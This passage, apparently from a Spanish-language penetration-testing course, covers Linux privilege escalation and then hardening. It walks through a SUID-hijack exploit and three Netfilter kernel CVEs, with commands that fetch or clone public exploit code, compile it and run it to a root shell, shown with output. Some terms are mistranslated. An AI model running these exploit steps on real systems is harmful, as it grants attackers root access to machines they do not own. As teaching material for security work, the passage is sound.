Con la ayuda de la 2a versión exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root. Sin embargo, antes de que podamos hacer eso, primero necesitamos encontrar estos binarios SUID. Para ello, podemos utilizar el siguiente comando:

#### Encuentra Binarios SUID

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Entonces podemos elegir un binario y especificar la ruta completa del binario como un argumento para el exploit y ejecutarlo.

#### Explotación

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```


## Netfilter

`Netfilter` es un módulo de kernel de Linux que proporciona, entre otras cosas, filtrado de paquetes, traducción de direcciones de red y otras herramientas relevantes para firewalls. Controla y regula el tráfico de red manipulando paquetes individuales en función de sus características y reglas. `Netfilter` también se llama la capa de software en el kernel de Linux. Cuando se reciben y envían paquetes de red, inicia la ejecución de otros módulos, como los filtros de paquetes. Estos módulos pueden entonces interceptar y manipular paquetes. Esto incluye los programas como `iptables` y `arptables`, que sirven como mecanismos de acción de la `Netfilter` sistema de gancho de la pila de protocolos IPv4 e IPv6.

Este módulo del kernel tiene tres funciones principales:

1. Desfragmentación del paquete
2. Seguimiento de conexión
3. Traducción de direcciones de red (NAT)

Cuando el módulo está activado, todos los paquetes IP son verificados por el `Netfilter` antes de que se reenvíen a la aplicación de destino del sistema propio o remoto. En 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), y también en 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), se encontraron varias vulnerabilidades que podrían conducir a una escalada de privilegios.

Muchas empresas tienen distribuciones de Linux preconfiguradas adaptadas a sus aplicaciones de software o viceversa. Esto les da a los desarrolladores y administradores, metafóricamente hablando, una "base dinámica" que es difícil de reemplazar. Esto requeriría adaptar el sistema a la aplicación de software o adaptar la aplicación al sistema más nuevo. Dependiendo del tamaño y la complejidad de la aplicación, esto puede tomar una gran cantidad de tiempo y esfuerzo. Esta es a menudo la razón por la que tantas empresas ejecutan distribuciones de Linux más antiguas y no actualizadas en producción.

Incluso si la compañía utiliza máquinas virtuales o contenedores como Docker, estos se basan en un kernel específico. La idea de aislar la aplicación de software del sistema host existente es un buen paso, pero hay muchas maneras de salir de dicho contenedor.

#### CVE-2021-22555

Versiones de kernel vulnerables: 2.6 - 5.11

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf

...SNIP...

root@ubuntu:/home/cry0l1t3# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2022-25636

Una vulnerabilidad reciente es [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) y afecta al kernel de Linux 5.4 hasta la versión 5.6.10. Esto es `net/netfilter/nf_dup_netdev.c`, que puede otorgar privilegios de root a usuarios locales debido a la escritura fuera de límites. `Nick Gregory` escribió un muy detallado [artículo](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) sobre cómo descubrió esta vulnerabilidad.

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

Sin embargo, debemos tener cuidado con este exploit, ya que puede dañar el kernel, y se requerirá un reinicio para volver a acceder al servidor.

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2023-32233

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.

#### Proof-Of-Concept

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

#### Exploitation

  Netfilter

```shell-session
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

Please keep in mind that these exploits can be very unstable and can break the system.


# Endurecimiento de linux

El endurecimiento adecuado de Linux puede eliminar la mayoría, si no todas, las oportunidades para la escalada de privilegios locales. Se deben tomar los siguientes pasos, como mínimo, para reducir el riesgo de que un ataque pueda elevarse al acceso a nivel de raíz:

---

## Actualizaciones y Patching

Existen muchos exploits de escalado de privilegios rápidos y fáciles para kernels de Linux desactualizados y versiones vulnerables conocidas de servicios integrados y de terceros. Realizar actualizaciones periódicas eliminará algunas de las "frutas bajas" más bajas que se pueden aprovechar para escalar privilegios. En Ubuntu, el paquete [mejoras desatendidas](https://packages.ubuntu.com/jammy/admin/unattended-upgrades) se instala de forma predeterminada desde la versión 18.04 en adelante y se puede instalar manualmente en Ubuntu desde al menos 10.04 (Lucid). Los sistemas operativos basados en Debian que se remontan a antes de Jessie también tienen este paquete disponible. En los sistemas basados en Red Hat, el [yum-crón](https://man7.org/linux/man-pages/man8/yum-cron.8.html) el paquete realiza una tarea similar.

---

## Gestión de Configuración

Esta no es una lista exhaustiva, pero algunas medidas de endurecimiento simples son:

- Audite archivos y directorios grabables y cualquier binario establecido con el bit SUID.
- Asegúrese de que los trabajos cron y los privilegios sudo especifiquen los binarios utilizando la ruta absoluta.
- No almacene credenciales en texto claro en archivos legibles por el mundo.
- Limpie los directorios del hogar y la historia de la fiesta.
- Asegúrese de que los usuarios de bajo privilegio no puedan modificar ninguna biblioteca personalizada llamada por programas.
- Elimine los paquetes y servicios innecesarios que potencialmente aumenten la superficie de ataque.
- Considere implementar [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux), que proporciona controles de acceso adicionales en el sistema.

---

## Gestión de Usuarios

Debemos limitar el número de cuentas de usuario y cuentas de administrador en cada sistema, asegurarnos de que los intentos de inicio de sesión (válidos/inválidos) se registren y supervisen. También es una buena idea hacer cumplir una política de contraseña segura, rotar contraseñas periódicamente y restringir a los usuarios la reutilización de contraseñas antiguas mediante el uso del archivo /etc/security/opasswd con el módulo PAM. Debemos comprobar que los usuarios no se colocan en grupos que les dan derechos excesivos que no son necesarios para sus tareas cotidianas y limitar los derechos sudo en base al principio de menor privilegio.

Existen plantillas para herramientas de automatización de gestión de configuración como [Marioneta](https://puppet.com/use-cases/configuration-management/), [SaltStack](https://github.com/saltstack/salt), [Zabbix](https://en.wikipedia.org/wiki/Zabbix) y [Nagios](https://en.wikipedia.org/wiki/Nagios) para automatizar tales comprobaciones y se puede utilizar para enviar mensajes a un canal de Slack o casilla de correo electrónico, así como a través de otros métodos. Las acciones remotas (Zabbix) y las Acciones de Remediación (Nagios) se pueden usar para encontrar y corregir automáticamente estos problemas a través de una flota de nodos. Las herramientas como Zabbix también cuentan con funciones como la verificación de suma de comprobación, que se puede utilizar tanto para el control de versiones como para confirmar que los binarios confidenciales no han sido manipulados. Por ejemplo, a través del [vfs.archivo.cksum](https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix_agent) archivo.

---

## Auditoría

Realizar comprobaciones periódicas de seguridad y configuración de todos los sistemas. Hay varias líneas de base de seguridad como la DISA [Guías de Implementación Técnica de Seguridad (STIGs)](https://public.cyber.mil/stigs/) eso se puede seguir para establecer un estándar de seguridad en todos los tipos y dispositivos del sistema operativo. Existen muchos marcos de cumplimiento, como [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), y [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html)que puede ser utilizado por una organización para ayudar a establecer líneas de base de seguridad. Todos estos deben ser utilizados como guías de referencia y no la base para un programa de seguridad. Un programa de seguridad sólido debe tener controles adaptados a las necesidades de la organización, el entorno operativo y los tipos de datos que almacenan y procesan (es decir, información de salud personal, datos financieros, secretos comerciales o información disponible públicamente).

Una revisión de auditoría y configuración no es un reemplazo para una prueba de penetración u otros tipos de evaluaciones técnicas y prácticas y, a menudo, se considera un ejercicio de "comprobación" en el que una organización es "pasada" en una auditoría de controles para realizar el mínimo. Estas revisiones pueden ayudar a complementar el escaneo regular de vulnerabilidades y las pruebas de penetración y los programas sólidos de administración de parches, vulnerabilidades y configuraciones.

Una herramienta útil para auditar sistemas basados en Unix (Linux, macOS, BDS, etc.) es [Lince](https://github.com/CISOfy/lynis). Esta herramienta audita la configuración actual de un sistema y proporciona consejos de endurecimiento adicionales, teniendo en cuenta varios estándares. Puede ser utilizado por equipos internos como administradores de sistemas, así como terceros (auditores y probadores de penetración) para obtener una "línea de base" de la configuración de seguridad actual del sistema. Una vez más, esta herramienta u otras similares no deben reemplazar las técnicas manuales discutidas en este módulo, pero pueden ser un fuerte suplemento para cubrir áreas que pueden pasarse por alto.

Después de clonar todo el repositorio, podemos ejecutar la herramienta escribiendo `./lynis audit system` y recibir un informe completo.

  Endurecimiento de Linux

```shell-session
htb_student@NIX02:~$ ./lynis audit system

[ Lynis 3.0.1 ]

################################################################################
  Lynis comes with ABSOLUTELY NO WARRANTY. This is free software, and you are
  welcome to redistribute it under the terms of the GNU General Public License.
  See the LICENSE file for details about using this software.

  2007-2020, CISOfy - https://cisofy.com/lynis/
  Enterprise support available (compliance, plugins, interface and tools)
################################################################################


[+] Initializing program
------------------------------------

  ###################################################################
  #                                                                 #
  #   NON-PRIVILEGED SCAN MODE                                      #
  #                                                                 #
  ###################################################################

  NOTES:
  --------------
  * Some tests will be skipped (as they require root permissions)
  * Some tests might fail silently or give different results

  - Detecting OS...                                           [ DONE ]
  - Checking profiles...                                      [ DONE ]

  ---------------------------------------------------
  Program version:           3.0.1
  Operating system:          Linux
  Operating system name:     Ubuntu
  Operating system version:  16.04
  Kernel version:            4.4.0
  Hardware platform:         x86_64
  Hostname:                  NIX02
```

El escaneo resultante se dividirá en advertencias:

  Endurecimiento de Linux

```shell-session
Warnings (2):
  ----------------------------
  ! Found one or more cronjob files with incorrect file permissions (see log for details) [SCHD-7704] 
      https://cisofy.com/lynis/controls/SCHD-7704/

  ! systemd-timesyncd never successfully synchronized time [TIME-3185] 
      https://cisofy.com/lynis/controls/TIME-3185/
```

Sugerencias:

  Endurecimiento de Linux

```shell-session
Suggestions (53):
  ----------------------------
  * Set a password on GRUB boot loader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122] 
      https://cisofy.com/lynis/controls/BOOT-5122/

  * If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] 
      https://cisofy.com/lynis/controls/KRNL-5820/

  * Run pwck manually and correct any errors in the password file [AUTH-9228] 
      https://cisofy.com/lynis/controls/AUTH-9228/

  * Configure minimum encryption algorithm rounds in /etc/login.defs [AUTH-9230] 
      https://cisofy.com/lynis/controls/AUTH-9230/
```

y una sección de detalles de escaneo general:

  Endurecimiento de Linux

```shell-session
Lynis security scan details:

  Hardening index : 60 [############        ]
  Tests performed : 256
  Plugins enabled : 2

  Components:
  - Firewall               [X]
  - Malware scanner        [X]

  Scan mode:
  Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)

  Lynis modules:
  - Compliance status      [?]
  - Security audit         [V]
  - Vulnerability scan     [V]

  Files:
  - Test and debug information      : /home/mrb3n/lynis.log
  - Report data                     : /home/mrb3n/lynis-report.dat
```

La herramienta es útil para informar rutas de escalado de privilegios y realizar una verificación de configuración rápida y realizará aún más comprobaciones si se ejecuta como usuario raíz.

---

## Conclusión

Como hemos visto, hay varias formas de escalar privilegios en los sistemas Linux/Unix, desde simples configuraciones erróneas y exploits públicos para servicios vulnerables conocidos hasta explotar el desarrollo basado en bibliotecas personalizadas. Una vez que se obtiene el acceso raíz, se hace más fácil usarlo como punto de pivote para una mayor explotación de la red. El endurecimiento de Linux (y de todos los sistemas) es crítico para organizaciones de todos los tamaños. Las pautas y controles de mejores prácticas existen en muchas formas diferentes. Las revisiones deben incluir una combinación de pruebas manuales prácticas y revisión y escaneo de configuración automatizado y validación de los resultados.